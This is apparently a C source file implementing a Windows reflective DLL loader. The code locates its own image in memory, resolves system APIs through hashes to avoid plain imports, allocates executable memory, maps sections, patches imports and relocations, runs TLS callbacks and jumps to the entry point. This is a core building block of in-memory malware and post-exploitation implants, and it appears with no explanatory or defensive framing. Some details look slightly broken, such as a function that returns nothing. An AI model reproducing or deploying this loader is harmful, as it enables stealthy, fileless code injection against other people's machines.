#define _WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include "hashes.h"
#include "util.h"
#define PTR(x) ((ULONG_PTR)x)
#define IMAGE_NT_HEADER(x) ( PTR(x) + ((PIMAGE_DOS_HEADER)x)->e_lfanew )

typedef struct tdFUNCTION {
	HMODULE (WINAPI *LoadLibraryA)(
		LPCSTR lpLibFileName
	);
	NTSTATUS (NTAPI *NtFlushInstructionCache)(
		HANDLE ProcessHandle,
		LPVOID BaseAddress,
		ULONG NumberOfBytesToFlush
	);
	LPVOID (WINAPI *VirtualAlloc)(
		LPVOID lpBase,
		SIZE_T Length,
		DWORD flCommit,
		DWORD flProtect
	);
	FARPROC (WINAPI *GetProcAddress)(
		HMODULE DllBase,
		LPCSTR szRoutineName
	);
	BOOL (WINAPI *DllMain)(
		HINSTANCE hInstDll,
		DWORD fdwReason,
		LPVOID lpReserved
	);
	BOOL (WINAPI *ExeMain)(
	);
} FUNCTIONS;

typedef struct _IMAGE_RELOC
{
	WORD Offset : 12;
	WORD Type   : 4;
} IMAGE_RELOC, *PIMAGE_RELOC;

__declspec(noinline) ULONG_PTR ReflectiveReturnAddress() {
	return (ULONG_PTR)__builtin_return_address(0);
};

HMODULE LoadExecutableImage( _In_ LPVOID lpImage, _In_ LPVOID lpParameter )
{
	PIMAGE_NT_HEADERS           NtsHdr = NULL;
	PIMAGE_SECTION_HEADER       SecHdr = NULL;
	PIMAGE_DATA_DIRECTORY       DatHdr = NULL;
	PIMAGE_IMPORT_DESCRIPTOR    ImpDes = NULL;
	PIMAGE_IMPORT_BY_NAME       ImpNam = NULL;
	PIMAGE_THUNK_DATA           ThkOne = NULL;
	PIMAGE_THUNK_DATA           ThkTwo = NULL;
	PIMAGE_BASE_RELOCATION      ImgRel = NULL;
	PIMAGE_RELOC                RelLst = NULL;
	PIMAGE_TLS_DIRECTORY        TlsDir = NULL;
	PIMAGE_TLS_CALLBACK*        TlsCbs = NULL;
	PIMAGE_DELAYLOAD_DESCRIPTOR DelDes = NULL;	

	LPVOID                      ModPtr = NULL;
	LPVOID                      VrtPtr = NULL;
	LPVOID                      KrnMod = NULL;
	LPVOID                      NtsMod = NULL;
	LPVOID                      DllPtr = NULL;

	DWORD                       RelCnt = 0;

	PCHAR                       ImpStr = NULL;

	PBYTE                       OffSet = 0;

	PULONG_PTR                  FunPtr = 0;

	FUNCTIONS                   tbFunc = { 0 };

	ModPtr = lpImage;
	KrnMod = GetLoadedModule(H_KERNEL32); 
	NtsMod = GetLoadedModule(H_NTDLL);

	if ( ( KrnMod != NULL ) && ( NtsMod != NULL ) ) {

		tbFunc.LoadLibraryA            = GetMemoryFunction(KrnMod, H_LOADLIBRARYA);
		tbFunc.VirtualAlloc            = GetMemoryFunction(KrnMod, H_VIRTUALALLOC);
		tbFunc.GetProcAddress          = GetMemoryFunction(KrnMod, H_GETPROCADDRESS);
		tbFunc.NtFlushInstructionCache = GetMemoryFunction(NtsMod, H_NTFLUSHINSTRUCTIONCACHE); 

		NtsHdr = (PIMAGE_NT_HEADERS)IMAGE_NT_HEADER ( ModPtr );
		SecHdr = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION( NtsHdr );
		VrtPtr = tbFunc.VirtualAlloc(NULL, NtsHdr->OptionalHeader.SizeOfImage, 
									 MEM_RESERVE | MEM_COMMIT, 0x40);

		for ( int i = 0 ; i < NtsHdr->FileHeader.NumberOfSections ; i++ ) {
			InlineCopyMemory( (LPVOID)(PTR(VrtPtr) + SecHdr[i].VirtualAddress),
                              (LPVOID)(PTR(ModPtr) + SecHdr[i].PointerToRawData),
                              SecHdr[i].SizeOfRawData );
		};

		DatHdr = &NtsHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
		ImpDes = (PIMAGE_IMPORT_DESCRIPTOR)( PTR(VrtPtr) + DatHdr->VirtualAddress );
		
		for ( ; ImpDes->Name != 0 ; ImpDes++ ) {
			ImpStr = (PCHAR)( PTR(VrtPtr) + ImpDes->Name );
			DllPtr = (LPVOID)tbFunc.LoadLibraryA( ImpStr );

			ThkOne = (PIMAGE_THUNK_DATA)( PTR( VrtPtr ) + ImpDes->OriginalFirstThunk );
			ThkTwo = (PIMAGE_THUNK_DATA)( PTR( VrtPtr ) + ImpDes->FirstThunk );
			
			for ( ;; ThkOne++, ThkTwo++ )
			{
				if ( ThkOne->u1.AddressOfData == 0 ) 
					break;

				FunPtr = (PULONG_PTR)PTR(&ThkTwo->u1.Function);
				if ( IMAGE_SNAP_BY_ORDINAL( ThkOne->u1.Ordinal ) ) {
					*FunPtr = PTR(tbFunc.GetProcAddress(DllPtr, (LPCSTR)IMAGE_ORDINAL(ThkOne->u1.Ordinal)));
				} else {
					ImpNam  = (PIMAGE_IMPORT_BY_NAME)( PTR(VrtPtr) + ThkOne->u1.AddressOfData );
					*FunPtr = PTR(tbFunc.GetProcAddress(DllPtr, (LPCSTR)ImpNam->Name));
				};
			};
		};

		DatHdr = &NtsHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];
		DelDes = (PIMAGE_DELAYLOAD_DESCRIPTOR)( PTR(VrtPtr) + DatHdr->VirtualAddress );

		for ( ; DelDes->DllNameRVA != 0 ; DelDes++ ) {
			ImpStr = (PCHAR)( PTR(VrtPtr) + DelDes->DllNameRVA );
			DllPtr = (LPVOID)tbFunc.LoadLibraryA( ImpStr );
		
			ThkOne = (PIMAGE_THUNK_DATA)( PTR( VrtPtr ) + DelDes->ImportNameTableRVA );
			ThkTwo = (PIMAGE_THUNK_DATA)( PTR( VrtPtr ) + DelDes->ImportAddressTableRVA );

			for ( ;; ThkOne++, ThkTwo++ )
			{
				if ( ThkOne->u1.AddressOfData == 0 )
					break;

				FunPtr = (PULONG_PTR)PTR(ThkTwo->u1.Function);
				if ( IMAGE_SNAP_BY_ORDINAL( ThkOne->u1.Ordinal ) ) {
					*FunPtr = PTR(tbFunc.GetProcAddress(DllPtr, (LPCSTR)IMAGE_ORDINAL(ThkOne->u1.Ordinal)));
				} else {
					ImpNam  = (PIMAGE_IMPORT_BY_NAME)( PTR(VrtPtr) + ThkOne->u1.AddressOfData );
					*FunPtr = PTR(tbFunc.GetProcAddress(DllPtr, (LPCSTR)ImpNam->Name));
				};
			};			
		};

		DatHdr = &NtsHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
		ImgRel = (PIMAGE_BASE_RELOCATION)( PTR( VrtPtr ) + DatHdr->VirtualAddress );
		OffSet = (PBYTE)VrtPtr - NtsHdr->OptionalHeader.ImageBase;
		
		while ( ImgRel->SizeOfBlock ) {
			RelLst = (PIMAGE_RELOC)( ImgRel + 1 );
			RelCnt = (ImgRel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);
			while ( RelCnt-- != 0 ) 
			{
				if ( RelLst->Type == IMAGE_REL_BASED_DIR64 )
					*(ULONG_PTR *)( ( PTR( VrtPtr ) + ImgRel->VirtualAddress ) + RelLst->Offset ) += 
							( PTR( VrtPtr ) - NtsHdr->OptionalHeader.ImageBase );
				else if ( RelLst->Type == IMAGE_REL_BASED_HIGHLOW )
					*(DWORD *)( ( PTR( VrtPtr ) + ImgRel->VirtualAddress ) + RelLst->Offset ) +=
					 (DWORD)( PTR( VrtPtr ) - NtsHdr->OptionalHeader.ImageBase );
				else if ( RelLst->Type == IMAGE_REL_BASED_HIGH )
					*(WORD  *)( ( PTR( VrtPtr ) + ImgRel->VirtualAddress ) + RelLst->Offset ) +=
							HIWORD( ( PTR( VrtPtr ) - NtsHdr->OptionalHeader.ImageBase ) );
				else if ( RelLst->Type == IMAGE_REL_BASED_LOW  )
					*(WORD  *)( ( PTR( VrtPtr ) + ImgRel->VirtualAddress ) + RelLst->Offset ) +=
							LOWORD( ( PTR( VrtPtr ) - NtsHdr->OptionalHeader.ImageBase ) );

				RelLst++;
			};
			ImgRel = (PIMAGE_BASE_RELOCATION)( ((PBYTE)PTR(ImgRel)) + ImgRel->SizeOfBlock ); 
		};

		DatHdr = &NtsHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
		if ( DatHdr->VirtualAddress != 0 ) {
			TlsDir = ( PIMAGE_TLS_DIRECTORY )( PTR( VrtPtr ) + DatHdr->VirtualAddress );
			TlsCbs = ( PIMAGE_TLS_CALLBACK *)( PTR( TlsDir->AddressOfCallBacks ) );
			if ( TlsCbs ) {
				while ( *TlsCbs != NULL ) {
					(*TlsCbs)((LPVOID)VrtPtr, DLL_PROCESS_ATTACH, NULL);
					TlsCbs++;
				};
			};
		};

		tbFunc.NtFlushInstructionCache( ((HANDLE)-1), NULL, 0 );
		if ( ( NtsHdr->FileHeader.Characteristics & IMAGE_FILE_DLL ) ) {
			tbFunc.DllMain = ( LPVOID )( PTR(VrtPtr) + NtsHdr->OptionalHeader.AddressOfEntryPoint );
			tbFunc.DllMain(VrtPtr, DLL_PROCESS_ATTACH, lpParameter );
		} else {
			tbFunc.ExeMain = ( LPVOID )( PTR(VrtPtr) + NtsHdr->OptionalHeader.AddressOfEntryPoint );
			tbFunc.ExeMain();
		};
	};
};

__declspec(dllexport) 
HMODULE ReflectiveLoader( _In_ LPVOID lpParameter )
{
	LPVOID ReflectiveModule = ( LPVOID ) ReflectiveReturnAddress();
	while ( ((PIMAGE_DOS_HEADER)ReflectiveModule)->e_magic 
		!= IMAGE_DOS_SIGNATURE ) ReflectiveModule--;

	return LoadExecutableImage ( ReflectiveModule, lpParameter );
};
